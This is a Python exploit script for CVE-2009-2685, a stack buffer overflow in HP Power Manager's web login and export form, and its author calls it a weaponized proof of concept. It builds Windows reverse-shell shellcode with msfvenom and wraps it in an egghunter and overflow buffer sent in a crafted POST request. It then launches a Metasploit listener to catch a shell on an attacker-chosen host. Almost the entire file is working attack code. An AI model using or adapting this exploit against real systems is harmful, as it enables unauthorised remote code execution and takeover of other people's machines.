#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#  ██░ ██  ██▓███   ███▄ ▄███▓ ██▀███   ▄████▄  ▓█████                                                      #
# ▓██░ ██▒▓██░  ██▒▓██▒▀█▀ ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                                      #
# ▒██▀▀██░▓██░ ██▓▒▓██    ▓██░▓██ ░▄█ ▒▒▓█    ▄ ▒███                                                        #
# ░▓█ ░██ ▒██▄█▓▒ ▒▒██    ▒██ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                                      #
# ░▓█▒░██▓▒██▒ ░  ░▒██▒   ░██▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                                     #
#  ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░   ░  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                                     #
#  ▒ ░▒░ ░░▒ ░     ░  ░      ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                                     #
#  ░  ░░ ░░░       ░      ░     ░░   ░ ░           ░                                                        #
#  ░  ░  ░                ░      ░     ░ ░         ░  ░                                                     #
#                                     ░                                                                     #
# hpm_rce.py - nighter                                                                                      #
#                                                                                                           #
# DATE                                                                                                      #
# 25/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Vulnerability: HP Power Manager 'formExportDataLogs' FormExportDataLogs Buffer Overflow                   #
# Stack-based buffer overflow in the login form in the management web server in HP Power Manager            #
# allows remote attackers to execute arbitrary code via the Login variable.                                 #
# Note I have read several versions of this PoC and I have just weaponized it. So cannot take credz         #
# for the b0f code                                                                                          #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################


import urllib
import os
import sys
import time
from socket import *

from multiprocessing import Process


def build_shellcode():

   print("[+] Build shellcode")
   cmd = """msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXITFUNC=thread -a x86 --platform windows -b "\\x00\\x1a\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5" -f raw -o /tmp/shellcode.bin 2>/dev/null""" % (LHOST, LPORT)
   os.system(cmd)

   if os.path.isfile('/tmp/shellcode.bin') is False:
      print("[-] Generate shellcode failed")
      sys.exit(0)


def exploit():

   egg="b33fb33f"
   buf = egg

   time.sleep(10)
   build_shellcode()
   fp = open('/tmp/shellcode.bin', 'rb')
   shellcode = fp.read()
   fp.close()
   os.unlink('/tmp/shellcode.bin')

   buf += shellcode

   hunter =  ""
   hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
   hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
   hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

   buffer = "\x41" * (721 -len(hunter))
   buffer +="\x90"*30 + hunter
   buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2
   buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)

   content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
   content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

   payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
   payload += "Host: %s\r\n" % HOST
   payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
   payload += "Accept: %s\r\n" % buf
   payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
   payload += "Content-Type: application/x-www-form-urlencoded\r\n"
   payload += "Content-Length: %s\r\n\r\n" % len(content)
   payload += content

   s = socket(AF_INET, SOCK_STREAM)
   s.connect((HOST, int(PORT)))
   print("[+] Exploit")
   s.send(payload)
   s.close()


def start_listener():

   print("[+] Start listener")
   listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD windows/shell_reverse_tcp;set LHOST %s;set LPORT %s;run'" % (
   LHOST, LPORT)
   os.system(listener)


if __name__ == '__main__':

    if len(sys.argv) != 4:
         print ("""
 ██░ ██  ██▓███   ███▄ ▄███▓ ██▀███   ▄████▄  ▓█████ 
▓██░ ██▒▓██░  ██▒▓██▒▀█▀ ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒██▀▀██░▓██░ ██▓▒▓██    ▓██░▓██ ░▄█ ▒▒▓█    ▄ ▒███   
░▓█ ░██ ▒██▄█▓▒ ▒▒██    ▒██ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░▓█▒░██▓▒██▒ ░  ░▒██▒   ░██▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
 ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░   ░  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ▒ ░▒░ ░░▒ ░     ░  ░      ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
 ░  ░░ ░░░       ░      ░     ░░   ░ ░           ░   
 ░  ░  ░                ░      ░     ░ ░         ░  ░
                                     ░               
[nighter@nighter.se] - CVE-2009-2685
           """)
         print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT>" % (sys.argv[0]))
         print("EXAMPLE: ./hpm_rce.py '10.10.10.70' 10.10.14.24 1337\n")
         sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '80'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if os.path.isfile('/usr/bin/msfconsole') is False:
        print('[-] Please install metasploit for run this PoC.')
        sys.exit(1)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    start_listener()


